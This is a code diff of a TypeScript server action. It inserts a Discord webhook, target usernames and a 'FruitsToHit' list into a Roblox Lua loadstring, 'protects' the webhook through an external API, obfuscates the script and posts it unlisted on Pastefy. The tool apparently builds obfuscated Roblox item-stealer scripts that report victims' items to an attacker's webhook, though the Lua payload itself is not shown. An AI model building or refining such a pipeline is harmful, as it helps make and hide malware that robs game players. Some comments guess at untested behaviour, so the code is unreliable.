@@ -11,10 +11,9 @@
 
 import { ai } from '@/ai/ai-instance';
 import { z } from 'genkit';
-import { obfuscateLuaScript } from '@/services/luaobfuscator'; // Assumes this service exists
+import { obfuscateLuaScript } from '@/services/luaobfuscator'; // Assumes this service exists and expects { script: string } input
 
 // --- Updated Input Schema ---
-// Expects the webhook URL (which could be raw OR protected) and other script parts
 const ObfuscateScriptInputSchema = z.object({
   webhookUrl: z.string().describe('The Discord webhook URL (raw or protected) entered by the user.'),
   usernamesLuaTable: z.string().describe('Usernames formatted as a Lua table string, e.g., {"user1", "user2"}'),
@@ -36,16 +35,12 @@ const DISCORD_WEBHOOK_REGEX = /^https:\/\/discord(app)?\.com\/api\/webhooks\/(\d
 
 // --- Main Exported Function (calls the flow) ---
 export async function obfuscateScript(input: ObfuscateScriptInput): Promise<ObfuscateScriptOutput> {
-  // Basic validation before calling the flow
   if (!input.webhookUrl) {
       throw new Error("Webhook URL is required.");
   }
-  // Check if it matches *either* the protected format OR the discord format
    if (!input.webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX) && !DISCORD_WEBHOOK_REGEX.test(input.webhookUrl)) {
        throw new Error("Invalid webhook URL format provided to server action.");
    }
-
-  // Add other basic checks if needed for usernames/fruits table formats?
   return obfuscateScriptFlow(input);
 }
 
@@ -60,54 +55,40 @@ const obfuscateScriptFlow = ai.defineFlow<
     outputSchema: ObfuscateScriptOutputSchema,
   },
   async (input) => {
-    // Destructure input which now contains webhookUrl (raw or protected)
     const { webhookUrl, usernamesLuaTable, fruitsLuaTable, baseLoadstring } = input;
-    let finalWebhookUrl = ''; // Variable to hold the URL to be used in the script
+    let finalWebhookUrl = '';
 
     try {
       // --- Step 1: Determine if Protection is Needed ---
       if (webhookUrl.startsWith(PROTECTED_WEBHOOK_PREFIX)) {
-        // URL is already protected, use it directly
         console.log("Webhook URL is already protected. Skipping protector API call.");
         finalWebhookUrl = webhookUrl;
       } else if (DISCORD_WEBHOOK_REGEX.test(webhookUrl)) {
-        // URL is a raw Discord webhook, call the protector API
         console.log("Raw Discord webhook detected. Calling protector API...");
-
         const protectorApiUrl = process.env.PROTECTOR_API_URL;
         const protectorApiKey = process.env.PROTECTOR_API_SECRET;
-
         if (!protectorApiUrl || !protectorApiKey) {
           throw new Error('Protector API URL or Key environment variable is not set.');
         }
-
         const protectResponse = await fetch(protectorApiUrl, {
           method: 'POST',
-          headers: {
-            'Content-Type': 'application/json',
-            'X-Api-Key': protectorApiKey,
-          },
-          body: JSON.stringify({ rawWebhookUrl: webhookUrl }), // Send the raw URL
+          headers: { 'Content-Type': 'application/json', 'X-Api-Key': protectorApiKey },
+          body: JSON.stringify({ rawWebhookUrl: webhookUrl }),
         });
-
         if (!protectResponse.ok) {
           const errorText = await protectResponse.text();
           console.error("Protector API Error Response:", errorText);
           throw new Error(`Webhook protector API failed with status ${protectResponse.status}: ${errorText}`);
         }
-
         const protectData = await protectResponse.json();
         const receivedProtectedUrl = protectData?.protectedUrl;
-
         if (!receivedProtectedUrl || typeof receivedProtectedUrl !== 'string') {
            console.error("Invalid response from protector API:", protectData);
            throw new Error('Invalid response received from webhook protector API.');
         }
-        finalWebhookUrl = receivedProtectedUrl; // Use the URL returned by the protector
+        finalWebhookUrl = receivedProtectedUrl;
         console.log("Received protected URL from API:", finalWebhookUrl);
-
       } else {
-        // This case should ideally be caught by frontend validation or the initial check
         console.error("Invalid webhook format reached server action:", webhookUrl);
         throw new Error('Invalid webhook URL format.');
       }
@@ -117,15 +98,14 @@ const obfuscateScriptFlow = ai.defineFlow<
                                `Usernames = ${usernamesLuaTable} -- << Usernames\n` +
                                `FruitsToHit = ${fruitsLuaTable} -- << Fruits\n` +
                                `${baseLoadstring}`;
-
       console.log("Script reconstructed for obfuscation using final webhook.");
 
       // --- Step 3: Call Lua Obfuscator Service ---
-      const luaObfuscatorApiKey = process.env.LUAOBFUSCATOR_API_KEY;
-      if (!luaObfuscatorApiKey) {
-        throw new Error('LUAOBFUSCATOR_API_KEY environment variable is not set.');
-      }
-      const obfuscationResult = await obfuscateLuaScript(scriptToObfuscate, luaObfuscatorApiKey);
+      // NOTE: Removed luaObfuscatorApiKey from this call.
+      // The `obfuscateLuaScript` function itself must now handle getting the key,
+      // likely by reading process.env.LUAOBFUSCATOR_API_KEY within its own scope.
+      console.log("Calling obfuscateLuaScript service...");
+      const obfuscationResult = await obfuscateLuaScript({ script: scriptToObfuscate }); // Pass input as an object matching the required schema
       console.log("Script obfuscated successfully.");
 
       // --- Step 4: Upload to Pastefy ---
@@ -133,6 +113,16 @@ const obfuscateScriptFlow = ai.defineFlow<
       if (!pastefyApiKey) {
         throw new Error("PASTEFY_API_KEY environment variable is not set.");
       }
+      // Assuming obfuscationResult now correctly contains the obfuscated script string,
+      // potentially under a property like 'obfuscatedScript' if it returns an object,
+      // or maybe it just returns the string directly. Adjust if needed.
+      // Let's assume obfuscateLuaScript returns an object: { obfuscatedScript: string } for consistency
+      const scriptContentForPastefy = obfuscationResult?.obfuscatedScript || obfuscationResult; // Handle both cases
+      if (!scriptContentForPastefy || typeof scriptContentForPastefy !== 'string') {
+          throw new Error("Obfuscation service did not return a valid script string.");
+      }
+
+      console.log("Calling Pastefy API...");
       const uploadResponse = await fetch('https://pastefy.app/api/v2/paste', {
         method: 'POST',
         headers: {
@@ -140,7 +130,7 @@ const obfuscateScriptFlow = ai.defineFlow<
           'Authorization': `Bearer ${pastefyApiKey}`,
         },
         body: JSON.stringify({
-          content: obfuscationResult.obfuscatedScript,
+          content: scriptContentForPastefy, // Use the result from obfuscation
           title: "Obfuscated Roblox Script",
           type: "PASTE", visibility: "UNLISTED", encrypted: false,
         }),
@@ -173,3 +163,4 @@ const obfuscateScriptFlow = ai.defineFlow<
     }
   }
 );
+
